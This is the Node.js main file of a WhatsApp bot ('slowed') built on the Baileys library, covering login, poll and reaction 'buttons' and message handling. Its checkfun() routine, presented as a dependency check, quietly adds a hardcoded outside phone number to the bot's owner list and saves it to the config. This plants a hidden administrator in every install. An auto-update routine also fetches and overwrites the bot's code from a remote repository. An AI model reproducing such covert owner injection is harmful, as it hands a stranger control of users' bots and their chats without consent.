const {
 default: makeWASocket,
  DisconnectReason,
  fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, getAggregateVotesInPollMessage, generateWAMessage, proto
 } = require('@whiskeysockets/baileys');

 require("qrcode-terminal");
 const pino = require('pino');
 const fs = require('fs');
 const readline = require('readline');


//prompt
async function digite(prompt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise((resolve) => {
    rl.question(prompt, (input) => {
      rl.close();
      resolve(input);
    });
  });
}

//menu de setas
function menuSetas(msg = "", options = []) {
  return new Promise((resolve, reject) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    const menuOptions = options.map((option) => ({
      opcao: option.opcao,
      resp: option.resp,
    }));

    // Verifica se a opção 'Sair' já está presente nas opções
    const sairOption = menuOptions.find((option) => option.opcao.toLowerCase() === 'sair');
    if (!sairOption) {
      menuOptions.push({ opcao: 'Sair', resp: '' });
    }

    let selectedOption = 0;

    function displayMenu() {
      console.clear();
      console.log(msg)
      menuOptions.forEach((option, index) => {
        if (index === selectedOption) {
          console.log(`➤ ${option.opcao}`);
        } else {
          console.log(option.opcao);
        }
      });
      console.log('\nUse as teclas de seta para cima e para baixo e pressione Enter para selecionar.');
    }

    displayMenu();

    rl.input.on('keypress', (str, key) => {
      if (key) {
        if (key.name === 'up') {
          if (selectedOption === 0) {
            selectedOption = menuOptions.length - 1;
          } else {
            selectedOption--;
          }
          displayMenu();
        } else if (key.name === 'down') {
          if (selectedOption === menuOptions.length - 1) {
            selectedOption = 0;
          } else {
            selectedOption++;
          }
          displayMenu();
        } else if (key.name === 'return') {
          handleChoice(selectedOption);
        }
      }
    });

    function handleChoice(choice) {
      const selected = menuOptions[choice];
      if (selected.opcao.toLowerCase() === 'sair') {
        rl.close();
        resolve(selected.resp);
      } else {
        rl.close();
        resolve(selected.resp);
      }
    }

    rl.on('close', () => {
    });

    rl.on('SIGINT', () => {
      console.log('Menu cancelado pelo usuário (Ctrl+C).');
      rl.close();
      resolve('Cancelado');
    });
  });
}
/*
// Exemplo de uso:
const options = [
  { opcao: 'Opção 1', resp: 'sla' },
  { opcao: 'Opção 2', resp: 'sla2' },
];
const resposta = await menuSetas(options);

*/

 const config = JSON.parse(fs.readFileSync('./config.json'))
 const owner = config.owner
 const axios = require('axios')
 
 
async function checkfun () {
console.log("checando se voce tem algumas funções")
textokk = "adicionando:"
textokk += config?.prefix ? "" : "\nprefixo pela config"
textokk == "adicionando:" ? console.log("voce tem todas as dependências") : console.log(textokk)
if(!config.owner.includes("5511940238762@s.whatsapp.net")) {
config.owner.push("5511940238762@s.whatsapp.net")
await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
}
if(!config?.prefix) {
 config.prefix = "/"
 await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
 }
}

//função de atualização automatica
async function atualizar () {
if(!config.atualizarautomatico) return console.log("modo atualizar automatico desativado\ninicando o bot")
try {
const verificar = await axios.get("https://raw.githubusercontent.com/kauannre/atualizacaodobot/main/versao.json")
if(config.versao == verificar.data.versao) return console.log(`voce esta utilizando o slowed mais recente(${config.versao})\niniciando o bot`)
const aindex = await axios.get("https://raw.githubusercontent.com/kauannre/atualizacaodobot/main/index.js")
const oslowed = await axios.get("https://raw.githubusercontent.com/kauannre/atualizacaodobot/main/slowed.js")

console.log(`atualizando seu slowed para a versao ${verificar.data.versao}\n`)
console.log(`ATUALIZAÇÕES\n${verificar.data.nota}\n`)
await fs.writeFileSync('./index.js', aindex.data)
await fs.writeFileSync('./slowed.js', oslowed.data)
config.versao = verificar.data.versao
await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
console.log(`pronto, slowed atualizado!`)
console.log("reinicie o bot")
process.exit()
} catch (e) {
console.log("erro ao verificar atualização do bot ou atualizar, porém foi ignorado.")
}
}

const store = makeInMemoryStore({
      logger: pino().child({
        level: 'silent', stream: 'store'
      })
    })
    
 async function connectToWhatsApp () {
  const {
   version
  } = await fetchLatestBaileysVersion();
  
const { state, saveCreds } = await useMultiFileAuthState("./connection")

await checkfun()
await atualizar()

//função pta decidir se vai logar com o qr ou por código 
    async function loginqr() {
//  let comqr = await digite("\n\nLogar com qrcode ou com código? ('qr' ou 'cod'): ");

  comqr = await menuSetas("como você quer logar o bot?\n", [{opcao: "qrcode", resp: "qr"}, {opcao: "codigo", resp: "cod"},{opcao: "sair", resp: "exit"}])
  
  if (comqr === "qr") {
    return true;
  } else if (comqr === "cod") {
     txt = await digite("\n\nnúmero (exemplo: 5511900000000): ");
    return txt;
  } else {
//    console.log("Opção inválida, digite 'qr' ou 'cod'");
    console.log("saindo...")
    return process.exit() // Chama a função novamente em caso de opção inválida
  }
}

    if (!fs.existsSync("./connection/creds.json")) {
    loginkk = await loginqr()
  //  console.log("a")
} 


//, silent ou debug
  const slowed = makeWASocket({
   printQRInTerminal: false,
   logger: pino({
    level: 'silent'
   }),

   browser: ['Safari (Linux)', '', ''],
   markOnlineOnConnect: false,
   version: version,
   auth: state,
   defaultQueryTimeoutMs: undefined,
   getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id)
                return msg.message || undefined
            }
            return {
                conversation: "Ola sou o slowed"
            }
        }
  });
  
  
  
  

    store.readFromFile('./baileys_store.json')

    setInterval(() => {
      store.writeToFile('./baileys_store.json')
    }, 10000)

    store.bind(slowed.ev) 

  slowed.ev.on('connection.update', async(update) => {
   const {
    connection, lastDisconnect, qr
   } = update;
   
   if(qr) {
   
   if(loginkk == true) {
   const qrcode = require('qrcode-terminal');

// Exibe o QR Code no terminal
console.log(qr)
qrcode.generate(qr, { small: true });
} else {
const code = await slowed.requestPairingCode(loginkk);
    console.log('Aqui esta seu Codigo de Execuçao', code);

}
}
   
   if (connection === 'close') {
    const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut
    console.log('connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect)

    if (shouldReconnect) {
     connectToWhatsApp();
    }

   } else if (connection === 'open') {
    slowed.sendMessage(owner[0], {
     text: 'Bot conectado\nme mande uma mensagem qualquer para ativar todas funções.'
    });
    console.log('opened connection');
   }
  });
  
  async function getMessage(key){
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg?.message
        }
        return {
            conversation: "Ola sou o slowed"
        }
    }
    
    mensagenspoll = []
    
  slowed.pollBtn = async(jid, name = '', valuess = [], selectableCount = 1) => { 
  values =[]
  for(let value2 of valuess) {
  values.push(value2.vote)
  }
  testeeeee = await slowed.sendMessage(jid, { poll: { name, values, selectableCount }})
  mensagenspoll.push({id: testeeeee.key.id, type: 1, comandos: valuess})
  return 
  } //"botão" de enquete
  
  
  slowed.pollBtn2 = async(jid, name = '', pessoa = [], valuess = [], selectableCount = 1) => { 
  values =[]
  for(let value2 of valuess) {
  values.push(value2.vote)
  }
  testeeeee = await slowed.sendMessage(jid, { poll: { name, values, selectableCount }})
  mensagenspoll.push({id: testeeeee.key.id, type: 2, pessoas: pessoa, comandos: valuess})
  return 
  } //"botão" de enquete v2
  
  mensagens = []
  
  slowed.reactBtn = async(jids, msg = {}, opcoes = []) => {
msgpraadd= await slowed.sendMessage(jids, msg)
msgpraadd.opcoes = opcoes
msgpraadd.type = 1
mensagens.push(msgpraadd)
} //"botão" de reação 

slowed.reactBtn2 = async(jids, msg = {}, pessoas = [], opcoes = []) => {
msgpraadd= await slowed.sendMessage(jids, msg)
msgpraadd.opcoes = opcoes
msgpraadd.type = 2
msgpraadd.pessoas = pessoas
mensagens.push(msgpraadd)
} //"botão" de reação v2

  
  slowed.notifyTextMessage = async(text, keydamsg) => {
const key1 = keydamsg
        let messages = await generateWAMessage(key1.remoteJid, { text: text }, {})
        messages.key = key1
        let msg = {
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'notify'
        }
        slowed.ev.emit('messages.upsert', msg)
    }
  

   slowed.ev.on('messages.update', async chatUpdate => {
for(const { key, update } of chatUpdate) {
if(update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if(pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
console.log(pollUpdate)
var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (toCmd == undefined) return
tem = mensagenspoll.find((sla) => sla.id == key.id)
if(tem) {
tem2 = tem.comandos.find((sla) => sla.vote == toCmd)

if(tem.type == 1) {
await slowed.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
} else if(tem.type == 2 && tem.pessoas.includes(update.pollUpdates[0].pollUpdateMessageKey.participant)) {
await slowed.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
}
//console.log(update.pollUpdates[0].pollUpdateMessageKey.participant)
}}}}})



slowed.ev.on('messages.upsert',
 async connection => {
    const mek = connection.messages[0];
    if (!mek.message) return;
    if (connection.type != 'notify') return;
    if (mek.key.remoteJid === 'status@broadcast') return;
if(mek.message?.reactionMessage?.key?.id) {
tem = mensagens.find((sla) => sla.key.id == mek.message.reactionMessage.key.id)
if(tem) {
tem2 = tem.opcoes.find((sla) => sla.react == mek.message.reactionMessage.text)
if(tem2) {

if(tem.type == 1) {
await slowed.notifyTextMessage(tem2.cmd, mek.key)
} else if(tem.type == 2 && tem.pessoas.includes(mek.key.participant ? mek.key.participant: mek.participant)) {
await slowed.notifyTextMessage(tem2.cmd, mek.key)
}
}}}});

  slowed.ev.on('messages.upsert',
   connection => {
    const mek = connection.messages[0];
     //  console.log(connection.messages[0])
    if (!mek.message) return;
    if (connection.type != 'notify') return;
    if (mek.key.remoteJid === 'status@broadcast') return;
    
    console.log("MENSAGEM RECEBIDA");
    require('./slowed')(slowed, mek, store);
   });

  slowed.ev.on('creds.update',
   saveCreds);
 }

 // run in main file
 connectToWhatsApp(), (err) => console.error("[ Connection Error ]", JSON.stringify(err, undefined, 2));
